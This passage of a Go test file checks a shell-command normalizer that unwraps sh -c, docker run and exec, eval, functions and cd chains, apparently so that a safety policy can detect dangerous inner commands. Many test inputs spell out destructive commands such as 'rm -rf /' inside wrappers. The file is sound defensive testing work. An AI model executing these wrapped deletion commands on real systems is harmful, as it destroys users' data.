		ReadRedirects: []string{"input"},
		Unresolved:    true,
	}}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("Normalize chroot redirects = %+v, want %+v", got, want)
	}

	got, err = Normalize(`chroot /new-root command -v git < input > output`, "")
	if err != nil {
		t.Fatal(err)
	}
	want = []Simple{{
		Redirects:     []string{"output"},
		ReadRedirects: []string{"input"},
		Unresolved:    true,
	}}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("Normalize empty chroot argv = %+v, want %+v", got, want)
	}
}

func TestNormalizeMarksUnknownWrapperFlagsUnresolved(t *testing.T) {
	cases := []struct {
		src               string
		wantArgv          []string
		wantRedirects     []string
		wantReadRedirects []string
	}{
		{`env --frobnicate ls`, []string{"env", "--frobnicate", "ls"}, nil, nil},
		{`nohup -x ls`, []string{"nohup", "-x", "ls"}, nil, nil},
		{`xargs --frobnicate ls`, []string{"xargs", "--frobnicate", "ls"}, nil, nil},
		{`exec --frobnicate ls`, []string{"exec", "--frobnicate", "ls"}, nil, nil},
		{`timeout --frobnicate 5 ls`, []string{"timeout", "--frobnicate", "5", "ls"}, nil, nil},
		{`nice --frobnicate ls`, []string{"nice", "--frobnicate", "ls"}, nil, nil},
		{`env -Z x < input > output`, []string{"env", "-Z", "x"}, []string{"output"}, []string{"input"}},
	}
	for _, c := range cases {
		got, err := Normalize(c.src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", c.src, err)
			continue
		}
		want := []Simple{{Argv: c.wantArgv, Redirects: c.wantRedirects, ReadRedirects: c.wantReadRedirects, Unresolved: true}}
		if !reflect.DeepEqual(got, want) {
			t.Errorf("Normalize(%q) = %+v, want %+v", c.src, got, want)
		}
	}
}

func TestNormalizeUnwrapsShellC(t *testing.T) {
	got, err := Normalize(`sh -c "rm -rf /"`, "")
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, s := range got {
		if reflect.DeepEqual(s.Argv, []string{"rm", "-rf", "/"}) {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected inner {rm -rf /} simple, got %v", argvs(got))
	}
}

func TestNormalizeUnwrapsAddedShellC(t *testing.T) {
	for _, shell := range []string{"fish", "csh", "tcsh", "mksh", "ash"} {
		src := shell + ` -c "rm -rf /"`
		got, err := Normalize(src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", src, err)
			continue
		}
		found := false
		for _, s := range got {
			if reflect.DeepEqual(s.Argv, []string{"rm", "-rf", "/"}) {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Normalize(%q) = %v, want inner {rm -rf /}", src, argvs(got))
		}
	}
}

func TestNormalizeUnwrapsClusteredShellC(t *testing.T) {
	for _, src := range []string{
		`mksh -lc "rm -rf /"`,
		`ash -lc "rm -rf /"`,
		`csh -fc "rm -rf /"`,
		`tcsh -fc "rm -rf /"`,
	} {
		got, err := Normalize(src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", src, err)
			continue
		}
		found := false
		for _, s := range got {
			if reflect.DeepEqual(s.Argv, []string{"rm", "-rf", "/"}) {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Normalize(%q) = %v, want inner {rm -rf /}", src, argvs(got))
		}
	}
}

func TestNormalizeShellCDoesNotScanPositionalOrLongOptions(t *testing.T) {
	for _, src := range []string{
		`mksh script -lc "rm -rf /"`,
		`tcsh script -fc "rm -rf /"`,
		`bash --rcfile -c "rm -rf /"`,
		`fish --init-command -c "rm -rf /"`,
	} {
		got, err := Normalize(src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", src, err)
			continue
		}
		for _, s := range got {
			if reflect.DeepEqual(s.Argv, []string{"rm", "-rf", "/"}) {
				t.Errorf("Normalize(%q) incorrectly exposed inner {rm -rf /}: %v", src, argvs(got))
			}
		}
	}
}

func TestNormalizeShellCParsesPreCommandOptionsByArity(t *testing.T) {
	for _, src := range []string{
		`bash --noprofile -c "rm -rf /"`,
		`bash -o posix -c "rm -rf /"`,
		`bash -oposix -c "rm -rf /"`,
		`bash -O extglob -c "rm -rf /"`,
		`bash -lOextglob -c "rm -rf /"`,
		`bash --rcfile=/tmp/bashrc -c "rm -rf /"`,
		`bash --init-file /tmp/bashrc -c "rm -rf /"`,
		`sh -o posix -c "rm -rf /"`,
		`mksh -oposix -c "rm -rf /"`,
		`fish --no-config -c "rm -rf /"`,
		`fish --init-command 'printf init' -c "rm -rf /"`,
	} {
		got, err := Normalize(src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", src, err)
			continue
		}
		found := false
		for _, s := range got {
			if reflect.DeepEqual(s.Argv, []string{"rm", "-rf", "/"}) {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Normalize(%q) = %v, want inner {rm -rf /}", src, argvs(got))
		}
	}
}

func TestNormalizeUnknownShellOptionFailsClosed(t *testing.T) {
	for _, src := range []string{
		`bash --future-option -c "rm -rf /"`,
		`bash -Z -c "rm -rf /"`,
		`fish --future-option -c "rm -rf /"`,
	} {
		got, err := Normalize(src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", src, err)
			continue
		}
		if len(got) != 1 || !got[0].Unresolved {
			t.Errorf("Normalize(%q) = %+v, want one unresolved Simple", src, got)
		}
	}
}

func TestNormalizeEmptyShellScriptOperandStopsOptionParsing(t *testing.T) {
	got, err := Normalize(`bash '' -c "rm -rf /"`, "")
	if err != nil {
		t.Fatal(err)
	}
	for _, s := range got {
		if reflect.DeepEqual(s.Argv, []string{"rm", "-rf", "/"}) {
			t.Fatalf("empty script operand exposed false inner command: %v", argvs(got))
		}
	}
}

func TestNormalizeMixedShellClustersAfterC(t *testing.T) {
	for _, src := range []string{
		`bash -co posix "rm -rf /"`,
		`bash -coposix "rm -rf /"`,
		`bash -cO extglob "rm -rf /"`,
		`bash -cOextglob "rm -rf /"`,
		`bash -cl "rm -rf /"`,
		`bash -cxl "rm -rf /"`,
	} {
		got, err := Normalize(src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", src, err)
			continue
		}
		found := false
		for _, s := range got {
			if reflect.DeepEqual(s.Argv, []string{"rm", "-rf", "/"}) {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Normalize(%q) = %v, want inner {rm -rf /}", src, argvs(got))
		}
	}
}

func TestNormalizeMalformedMixedShellClustersFailClosed(t *testing.T) {
	for _, src := range []string{
		`bash -co`,
		`bash -co posix`,
		`bash -cO`,
		`bash -cO extglob`,
	} {
		got, err := Normalize(src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", src, err)
			continue
		}
		if len(got) != 1 || !got[0].Unresolved {
			t.Errorf("Normalize(%q) = %+v, want one unresolved Simple", src, got)
		}
	}
}

func TestNormalizeUsesShellSpecificOptionGrammar(t *testing.T) {
	for _, src := range []string{
		`dash -I -c "rm -rf /"`,
		`bash --debug -c "rm -rf /"`,
		`bash --debugger -c "rm -rf /"`,
		`bash --login -c "rm -rf /"`,
		`bash --noediting -c "rm -rf /"`,
		`bash --norc -c "rm -rf /"`,
		`bash --posix -c "rm -rf /"`,
		`bash --pretty-print -c "rm -rf /"`,
		`bash --restricted -c "rm -rf /"`,
		`bash --verbose -c "rm -rf /"`,
		`bash --noprofile -l -c "rm -rf /"`,
	} {
		got, err := Normalize(src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", src, err)
			continue
		}
		found := false
		for _, s := range got {
			if reflect.DeepEqual(s.Argv, []string{"rm", "-rf", "/"}) {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Normalize(%q) = %v, want inner {rm -rf /}", src, argvs(got))
		}
	}

	for _, src := range []string{
		`dash -h -c "rm -rf /"`,
		`bash -l --noprofile -c "rm -rf /"`,
	} {
		got, err := Normalize(src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", src, err)
			continue
		}
		if len(got) != 1 || !got[0].Unresolved {
			t.Errorf("Normalize(%q) = %+v, want one unresolved Simple", src, got)
		}
	}

	for _, src := range []string{
		`zsh -b -c "rm -rf /"`,
		`bash -- -c "rm -rf /"`,
		`bash --help -c "rm -rf /"`,
		`bash --version -c "rm -rf /"`,
		`bash --dump-strings -c "rm -rf /"`,
		`bash --dump-po-strings -c "rm -rf /"`,
	} {
		got, err := Normalize(src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", src, err)
			continue
		}
		for _, s := range got {
			if reflect.DeepEqual(s.Argv, []string{"rm", "-rf", "/"}) {
				t.Errorf("Normalize(%q) incorrectly exposed inner command: %v", src, argvs(got))
			}
		}
	}
}

func TestNormalizeChrootRetainsZeroResultAsUnresolved(t *testing.T) {
	for _, src := range []string{
		`chroot /new-root command -v git`,
		`chroot /new-root command -V git`,
		`chroot /new-root command`,
		`chroot /new-root exec`,
	} {
		got, err := Normalize(src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", src, err)
			continue
		}
		want := []Simple{{Unresolved: true}}
		if !reflect.DeepEqual(got, want) {
			t.Errorf("Normalize(%q) = %+v, want %+v", src, got, want)
		}
	}
}

func TestNormalizeNonChrootZeroResultRemainsEmpty(t *testing.T) {
	for _, src := range []string{`command -v git`, `command -V git`, `command`, `exec`} {
		got, err := Normalize(src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", src, err)
			continue
		}
		if len(got) != 0 {
			t.Errorf("Normalize(%q) = %+v, want no Simples", src, got)
		}
	}

	got, err := Normalize(`chroot /new-root command git status`, "")
	if err != nil {
		t.Fatal(err)
	}
	want := []Simple{{Argv: []string{"git", "status"}, Unresolved: true}}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("Normalize chroot positional command = %+v, want %+v", got, want)
	}
}

func TestNormalizeCommandVYieldsNoCommand(t *testing.T) {
	got, err := Normalize(`command -v git`, "")
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 0 {
		t.Fatalf("command -v git = %v, want no inner command", argvs(got))
	}
}

func TestNormalizeUnwrapsRunners(t *testing.T) {
	got, err := Normalize(`docker run --rm alpine rm -rf /data`, "")
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, s := range got {
		if reflect.DeepEqual(s.Argv, []string{"rm", "-rf", "/data"}) {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected an inner {rm -rf /data} simple, got %v", argvs(got))
	}
}

func TestNormalizeDockerFamilyRunExecValuedOptions(t *testing.T) {
	cases := []string{
		`docker run --rm -v /:/host alpine rm -rf /`,
		`docker run -e A=b alpine rm -rf /`,
		`docker run --volume=/:/host -eA=b -p8080:80 -w/host -u0 alpine rm -rf /`,
		`docker --context dev run --mount type=bind,src=/,dst=/host --name x alpine rm -rf /`,
		`docker exec --env A=b --workdir /host container rm -rf /`,
		`podman run --network host alpine rm -rf /`,
		`nerdctl exec --env=A=b container rm -rf /`,
		`docker run -- --name rm -rf /`,
	}
	for _, src := range cases {
		got, err := Normalize(src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", src, err)
			continue
		}
		found := false
		for _, s := range got {
			if reflect.DeepEqual(s.Argv, []string{"rm", "-rf", "/"}) {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Normalize(%q) = %v, want inner {rm -rf /}", src, argvs(got))
		}
	}
}

func TestNormalizeDockerRunPrependsConfiguredEntrypoint(t *testing.T) {
	cases := map[string][]string{
		`docker run --entrypoint rm alpine -rf /`:      {"rm", "-rf", "/"},
		`docker run --entrypoint=/bin/rm alpine -rf /`: {"/bin/rm", "-rf", "/"},
		`podman run --entrypoint rm alpine -rf /`:      {"rm", "-rf", "/"},
		`nerdctl run --entrypoint=rm alpine -rf /`:     {"rm", "-rf", "/"},
	}
	for source, want := range cases {
		got, err := Normalize(source, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", source, err)
			continue
		}
		found := false
		for _, simple := range got {
			if reflect.DeepEqual(simple.Argv, want) {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Normalize(%q) = %v, want inner %q", source, argvs(got), want)
		}
	}
}

func TestRunnerInnerRejectsInvalidDockerEntrypoint(t *testing.T) {
	for _, argv := range [][]string{
		{"docker", "run", "--entrypoint="},
		{"docker", "run", "--entrypoint=", "alpine"},
		{"docker", "run", "--entrypoint", "rm"},
	} {
		if _, err := runnerInner(argv); err == nil {
			t.Errorf("runnerInner(%q) error = nil, want invalid-entrypoint error", argv)
		}
	}
}

func TestRunnerInnerKeepsFlagsAfterImage(t *testing.T) {
	got, err := runnerInner([]string{"docker", "run", "alpine", "--name", "x", "rm", "-rf", "/"})
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"--name", "x", "rm", "-rf", "/"}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("runnerInner() = %q, want %q", got, want)
	}
}

func TestRunnerInnerRejectsMissingDockerOptionValues(t *testing.T) {
	for _, argv := range [][]string{
		{"docker", "run", "--name"},
		{"docker", "run", "--hostname"},
		{"docker", "run", "--platform"},
		{"docker", "run", "--label"},
		{"docker", "run", "--pull"},
		{"podman", "exec", "--workdir"},
		{"nerdctl", "run", "-v"},
	} {
		if _, err := runnerInner(argv); err == nil {
			t.Errorf("runnerInner(%q) error = nil, want missing-value error", argv)
		}
	}
}

func TestNormalizeDockerRunUsesRunSpecificOptionArity(t *testing.T) {
	cases := []string{
		`docker run --rm --hostname sandbox -v /:/host alpine rm -rf /host`,
		`docker run --platform linux/amd64 alpine rm -rf /`,
		`docker run --platform=linux/amd64 alpine rm -rf /`,
		`docker run --label role=test alpine rm -rf /`,
		`docker run --label=role=test alpine rm -rf /`,
		`docker run --pull always alpine rm -rf /`,
		`docker run --pull=always alpine rm -rf /`,
		`docker run --hostname --force --label /tmp/label alpine rm -rf /`,
		`docker run -itv/:/host -lrole=test alpine rm -rf /`,
	}
	for _, src := range cases {
		got, err := Normalize(src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", src, err)
			continue
		}
		found := false
		for _, s := range got {
			if len(s.Argv) >= 2 && s.Argv[0] == "rm" && s.Argv[1] == "-rf" {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Normalize(%q) = %v, want inner rm -rf", src, argvs(got))
		}
	}
}

func TestNormalizeDockerRunDetachKeysExactly(t *testing.T) {
	cases := []struct {
		src  string
		want [][]string
	}{
		{
			`docker run --detach-keys ctrl-x alpine rm -rf /`,
			[][]string{
				{"docker", "run", "--detach-keys", "ctrl-x", "alpine", "rm", "-rf", "/"},
				{"rm", "-rf", "/"},
			},
		},
		{
			`docker run --detach-keys=ctrl-x alpine rm -rf /`,
			[][]string{
				{"docker", "run", "--detach-keys=ctrl-x", "alpine", "rm", "-rf", "/"},
				{"rm", "-rf", "/"},
			},
		},
	}
	for _, tc := range cases {
		got, err := Normalize(tc.src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", tc.src, err)
			continue
		}
		if gotArgv := argvs(got); !reflect.DeepEqual(gotArgv, tc.want) {
			t.Errorf("Normalize(%q) = %q, want %q", tc.src, gotArgv, tc.want)
		}
	}
}

func TestDockerRunDetachKeysMissingValueFailsClosed(t *testing.T) {
	argv := []string{"docker", "run", "--detach-keys"}
	_, err := runnerInner(argv)
	if err == nil || !strings.Contains(err.Error(), "requires a value") {
		t.Fatalf("runnerInner(%q) error = %v, want requires-value error", argv, err)
	}
	v := evalBash(t, `docker run --detach-keys`)
	if v == nil || v.RuleID != "P3.unresolved" {
		t.Fatalf("missing --detach-keys -> %+v, want non-allow/P3.unresolved", v)
	}
}

func TestNormalizeDockerExecUsesExecSpecificOptionArity(t *testing.T) {
	cases := []string{
		`docker exec --detach-keys ctrl-x -e A=b -u 0 -w /tmp container rm -rf /`,
		`docker exec --detach-keys=ctrl-x -iteA=b -u0 -w/tmp container rm -rf /`,
		`podman exec --env-file /tmp/env container rm -rf /`,
		`nerdctl exec --privileged container rm -rf /`,
	}
	for _, src := range cases {
		got, err := Normalize(src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", src, err)
			continue
		}
		found := false
		for _, s := range got {
			if reflect.DeepEqual(s.Argv, []string{"rm", "-rf", "/"}) {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Normalize(%q) = %v, want inner {rm -rf /}", src, argvs(got))
		}
	}
}

func TestDockerRunExecUnknownOrMalformedOptionsFailClosed(t *testing.T) {
	commands := []string{
		`docker run --future value alpine rm -rf /`,
		`docker exec --future value container rm -rf /`,
		`docker run --rm=maybe alpine rm -rf /`,
		`docker exec --privileged=maybe container rm -rf /`,
		`docker exec --hostname sandbox container rm -rf /`,
	}
	for _, command := range commands {
		v := evalBash(t, command)
		if v == nil || v.RuleID != "P3.unresolved" {
			t.Errorf("%q -> %+v, want non-allow/P3.unresolved", command, v)
		}
	}
}

func TestNormalizeRecognizesAbsoluteWrappersShellsAndRunners(t *testing.T) {
	cases := []string{
		`/usr/bin/env rm -rf /`,
		`/bin/bash -c 'rm -rf /'`,
		`/usr/bin/docker run --rm alpine rm -rf /`,
		`busybox rm -rf /`,
		`/bin/busybox rm -rf /`,
	}
	for _, src := range cases {
		got, err := Normalize(src, "")
		if err != nil {
			t.Fatalf("Normalize(%q): %v", src, err)
		}
		found := false
		for _, s := range got {
			if reflect.DeepEqual(s.Argv, []string{"rm", "-rf", "/"}) {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Normalize(%q) = %v, want inner {rm -rf /}", src, argvs(got))
		}
	}
}

func TestNormalizeTracksLiteralCdCwd(t *testing.T) {
	repo := t.TempDir()
	if err := os.MkdirAll(filepath.Join(repo, "src", "nested"), 0o755); err != nil {
		t.Fatal(err)
	}
	got, err := Normalize(`cd src; cd nested; rm -rf build`, repo)
	if err != nil {
		t.Fatal(err)
	}
	want := []Simple{
		{Argv: []string{"cd", "src"}, Cwd: repo},
		{Argv: []string{"cd", "nested"}, Cwd: filepath.Join(repo, "src")},
		{Argv: []string{"rm", "-rf", "build"}, Cwd: filepath.Join(repo, "src", "nested")},
	}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("Normalize cd chain = %+v, want %+v", got, want)
	}

	got, err = Normalize(`cd -- /etc; rm -rf .`, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	want = []Simple{
		{Argv: []string{"cd", "--", "/etc"}, Cwd: "/repo"},
		{Argv: []string{"rm", "-rf", "."}, Cwd: "/etc"},
	}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("Normalize cd -- = %+v, want %+v", got, want)
	}
}

func TestNormalizeTracksChainedConditionalCdSuccessPath(t *testing.T) {
	repo := t.TempDir()
	if err := os.MkdirAll(filepath.Join(repo, "src", "nested"), 0o755); err != nil {
		t.Fatal(err)
	}
	got, err := Normalize(`cd src && cd nested && rm -rf build`, repo)
	if err != nil {
		t.Fatal(err)
	}
	last := got[len(got)-1]
	wantCwd := filepath.Join(repo, "src", "nested")
	if !reflect.DeepEqual(last.Argv, []string{"rm", "-rf", "build"}) || last.Cwd != wantCwd || last.Unresolved {
		t.Fatalf("last = %+v, want resolved rm in %s", last, wantCwd)
	}
}

func TestNormalizeUnknownCdInvalidatesFollowingCwd(t *testing.T) {
	commands := []string{
		`cd; rm -rf .`,
		`cd -; rm -rf .`,
		`cd $TARGET; rm -rf .`,
		`cd one two; rm -rf .`,
		`cd -Z /etc; rm -rf .`,
		`pushd /etc; rm -rf .`,
		`popd; rm -rf .`,
	}
	for _, command := range commands {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Errorf("Normalize(%q): %v", command, err)
			continue
		}
		last := got[len(got)-1]
		if last.Cwd != "" || !last.Unresolved {
			t.Errorf("Normalize(%q) last = %+v, want unknown cwd and unresolved", command, last)
		}
	}
}

func TestNormalizeCdScopeBoundaries(t *testing.T) {
	cases := []struct {
		command string
		wantCwd string
	}{
		{`(cd /etc); rm -rf build`, "/repo"},
		{`cd /etc | cat; rm -rf build`, "/repo"},
		{`value=$(cd /etc); rm -rf build`, "/repo"},
		{`cat <(cd /etc); rm -rf build`, "/repo"},
		{`bash -c 'cd /etc'; rm -rf build`, "/repo"},
	}
	for _, tc := range cases {
		got, err := Normalize(tc.command, "/repo")
		if err != nil {
			t.Errorf("Normalize(%q): %v", tc.command, err)
			continue
		}
		last := got[len(got)-1]
		if !reflect.DeepEqual(last.Argv, []string{"rm", "-rf", "build"}) || last.Cwd != tc.wantCwd {
			t.Errorf("Normalize(%q) last = %+v, want rm cwd %q", tc.command, last, tc.wantCwd)
		}
	}

	got, err := Normalize(`{ cd /etc; rm -rf .; }`, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	last := got[len(got)-1]
	if last.Cwd != "/etc" {
		t.Fatalf("brace-group rm = %+v, want cwd /etc", last)
	}
}

func TestNormalizeIsolatedScopesTrackTheirOwnCd(t *testing.T) {
	commands := []string{
		`(cd /etc; rm -rf .)`,
		`printf x | { cd /etc; rm -rf .; }`,
	}
	for _, command := range commands {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Errorf("Normalize(%q): %v", command, err)
			continue
		}
		last := got[len(got)-1]
		if !reflect.DeepEqual(last.Argv, []string{"rm", "-rf", "."}) || last.Cwd != "/etc" {
			t.Errorf("Normalize(%q) last = %+v, want rm cwd /etc", command, last)
		}
	}
}

func TestNormalizeUncertainControlFlowInvalidatesJoin(t *testing.T) {
	commands := []string{
		`if condition; then cd /etc; fi; rm -rf .`,
		`while condition; do cd /etc; done; rm -rf .`,
		`for item in $ITEMS; do cd /etc; done; rm -rf .`,
	}
	for _, command := range commands {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Errorf("Normalize(%q): %v", command, err)
			continue
		}
		last := got[len(got)-1]
		if last.Cwd != "" || !last.Unresolved {
			t.Errorf("Normalize(%q) last = %+v, want unknown cwd and unresolved", command, last)
		}
	}
}

func TestNormalizeInnerShellAndWatchUseStatementCwd(t *testing.T) {
	commands := []string{
		`cd /etc; bash -c 'rm -rf .'`,
		`cd /etc; watch 'rm -rf .'`,
	}
	for _, command := range commands {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Errorf("Normalize(%q): %v", command, err)
			continue
		}
		last := got[len(got)-1]
		if !reflect.DeepEqual(last.Argv, []string{"rm", "-rf", "."}) || last.Cwd != "/etc" {
			t.Errorf("Normalize(%q) last = %+v, want rm cwd /etc", command, last)
		}
	}
}

func TestNormalizeRelativeCdWithEmptyCwdIsUnknown(t *testing.T) {
	got, err := Normalize(`cd relative; rm -rf .`, "")
	if err != nil {
		t.Fatal(err)
	}
	last := got[len(got)-1]
	if last.Cwd != "" || !last.Unresolved {
		t.Fatalf("last = %+v, want unknown cwd and unresolved", last)
	}
}

func TestNormalizeCdSuccessAndFailureOutcomes(t *testing.T) {
	repo := t.TempDir()
	missing := filepath.Join(repo, "missing")
	notDir := filepath.Join(repo, "file")
	if err := os.WriteFile(notDir, nil, 0o600); err != nil {
		t.Fatal(err)
	}
	for _, target := range []string{missing, notDir} {
		command := fmt.Sprintf(`cd /etc; cd %q; rm -rf .`, target)
		got, err := Normalize(command, repo)
		if err != nil {
			t.Fatal(err)
		}
		last := got[len(got)-1]
		if last.Cwd != "/etc" || last.Unresolved {
			t.Errorf("Normalize(%q) last = %+v, want known cwd /etc", command, last)
		}
	}

	got, err := Normalize(fmt.Sprintf(`cd %q && rm -rf /`, missing), repo)
	if err != nil {
		t.Fatal(err)
	}
	for _, simple := range got {
		if reflect.DeepEqual(simple.Argv, []string{"rm", "-rf", "/"}) {
			t.Fatalf("known failed cd exposed unreachable rm: %+v", got)
		}
	}

	created := filepath.Join(repo, "created")
	got, err = Normalize(fmt.Sprintf(`mkdir %q; cd %q; pwd`, created, created), repo)
	if err != nil {
		t.Fatal(err)
	}
	if last := got[len(got)-1]; last.Cwd != "" || !last.Unresolved {
		t.Fatalf("post-mutation cd last = %+v, want unresolved cwd", last)
	}
}

func TestNormalizeCdPathAssignmentsAndModes(t *testing.T) {
	repo := t.TempDir()
	localSSL := filepath.Join(repo, "ssl")
	if err := os.Mkdir(localSSL, 0o700); err != nil {
		t.Fatal(err)
	}
	out := t.TempDir()
	physicalTarget := filepath.Join(out, "target")
	if err := os.Mkdir(physicalTarget, 0o700); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(repo, "link")
	if err := os.Symlink(physicalTarget, link); err != nil {
		t.Skipf("create symlink: %v", err)
	}

	cases := []struct {
		command string
		wantCwd string
	}{
		{`CDPATH=/etc cd ssl; pwd`, "/etc/ssl"},
		{`CDPATH=/etc; cd ssl; pwd`, "/etc/ssl"},
		{`OTHER=value cd ./ssl; pwd`, localSSL},
		{`cd -L link; pwd`, link},
		{`cd -P link; pwd`, physicalTarget},
		{`cd -L link/..; pwd`, repo},
		{`cd -P link/..; pwd`, out},
	}
	for _, test := range cases {
		got, err := Normalize(test.command, repo)
		if err != nil {
			t.Errorf("Normalize(%q): %v", test.command, err)
			continue
		}
		last := got[len(got)-1]
		if last.Cwd != test.wantCwd || last.Unresolved {
			t.Errorf("Normalize(%q) last = %+v, want cwd %q", test.command, last, test.wantCwd)
		}
	}

	t.Setenv("CDPATH", "/etc")
	got, err := Normalize(`cd ssl; pwd`, repo)
	if err != nil {
		t.Fatal(err)
	}
	if last := got[len(got)-1]; last.Cwd != "/etc/ssl" || last.Unresolved {
		t.Fatalf("ambient CDPATH last = %+v, want /etc/ssl", last)
	}
	got, err = Normalize(`cd ./ssl; pwd`, repo)
	if err != nil {
		t.Fatal(err)
	}
	if last := got[len(got)-1]; last.Cwd != localSSL || last.Unresolved {
		t.Fatalf("dot-relative CDPATH bypass last = %+v, want %s", last, localSSL)
	}

	t.Setenv("CDPATH", "")
	commandCDPath := t.TempDir()
	for _, directory := range []string{"first", "next"} {
		if err := os.Mkdir(filepath.Join(commandCDPath, directory), 0o700); err != nil {
			t.Fatal(err)
		}
	}
	got, err = Normalize(fmt.Sprintf(`CDPATH=%q cd first; cd next; pwd`, commandCDPath), repo)
	if err != nil {
		t.Fatal(err)
	}
	if want := filepath.Join(commandCDPath, "first"); got[len(got)-1].Cwd != want || got[len(got)-1].Unresolved {
		t.Fatalf("temporary CDPATH assignment last = %+v, want failed second cd to retain %s", got[len(got)-1], want)
	}

	got, err = Normalize(`cd -LP /etc; pwd`, repo)
	if err != nil {
		t.Fatal(err)
	}
	if last := got[len(got)-1]; last.Cwd != "" || !last.Unresolved {
		t.Fatalf("conflicting cd modes last = %+v, want unresolved cwd", last)
	}

	firstRoot := t.TempDir()
	secondRoot := t.TempDir()
	if err := os.Mkdir(filepath.Join(secondRoot, "created"), 0o700); err != nil {
		t.Fatal(err)
	}
	command := fmt.Sprintf(`mkdir %q; CDPATH=%q cd created && pwd`, filepath.Join(firstRoot, "created"), firstRoot+string(os.PathListSeparator)+secondRoot)
	got, err = Normalize(command, repo)
	if err != nil {
		t.Fatal(err)
	}
	if last := got[len(got)-1]; last.Cwd != "" || !last.Unresolved {
		t.Fatalf("post-mutation CDPATH selection last = %+v, want unknown cwd", last)
	}
}

func TestNormalizeUnknownCwdIsStickyAcrossRecursiveSources(t *testing.T) {
	commands := []string{
		`cd "$TARGET"; cd /etc; pwd`,
		`cd "$TARGET"; bash -c 'cd /etc; pwd'`,
		`cd "$TARGET"; watch 'cd /etc; pwd'`,
		`cd "$TARGET"; eval 'cd /etc; pwd'`,
	}
	for _, command := range commands {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Errorf("Normalize(%q): %v", command, err)
			continue
		}
		last := got[len(got)-1]
		if last.Cwd != "" || !last.Unresolved {
			t.Errorf("Normalize(%q) last = %+v, want sticky unknown cwd", command, last)
		}
	}
}

func TestNormalizeEvalUsesCurrentShellState(t *testing.T) {
	got, err := Normalize(`eval 'cd /etc'; pwd`, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	if last := got[len(got)-1]; last.Cwd != "/etc" || last.Unresolved {
		t.Fatalf("eval cd last = %+v, want cwd /etc", last)
	}
	foundRm := false
	got, err = Normalize(`eval 'rm -rf /'`, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	for _, simple := range got {
		foundRm = foundRm || reflect.DeepEqual(simple.Argv, []string{"rm", "-rf", "/"})
	}
	if !foundRm {
		t.Fatalf("eval did not expose inner rm: %+v", got)
	}

	got, err = Normalize(`eval "$SOURCE"; pwd`, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	if last := got[len(got)-1]; last.Cwd != "" || !last.Unresolved {
		t.Fatalf("dynamic eval last = %+v, want unresolved cwd", last)
	}
}

func TestNormalizeReusesStaticControlReachability(t *testing.T) {
	commands := []string{
		`false && rm -rf /`,
		`true || rm -rf /`,
		`if false; then rm -rf /; fi`,
		`case x in y) rm -rf /;; x) printf ok;; esac`,
		`while false; do rm -rf /; done`,
		`until true; do rm -rf /; done`,
		`for item in; do rm -rf /; done`,
	}
	for _, command := range commands {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Errorf("Normalize(%q): %v", command, err)
			continue
		}
		for _, simple := range got {
			if reflect.DeepEqual(simple.Argv, []string{"rm", "-rf", "/"}) {
				t.Errorf("Normalize(%q) exposed unreachable rm: %+v", command, got)
			}
		}
	}
}

func TestNormalizeFunctionsOnlyWhenInvoked(t *testing.T) {
	got, err := Normalize(`danger() { rm -rf /; }`, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 0 {
		t.Fatalf("uncalled function emitted Simples: %+v", got)
	}

	got, err = Normalize(`danger() { rm -rf /; }; danger`, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	foundRm := false
	for _, simple := range got {
		foundRm = foundRm || reflect.DeepEqual(simple.Argv, []string{"rm", "-rf", "/"})
	}
	if !foundRm {
		t.Fatalf("invoked function did not emit body: %+v", got)
	}

	got, err = Normalize(`move() { cd /etc; }; move; pwd`, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	if last := got[len(got)-1]; last.Cwd != "/etc" || last.Unresolved {
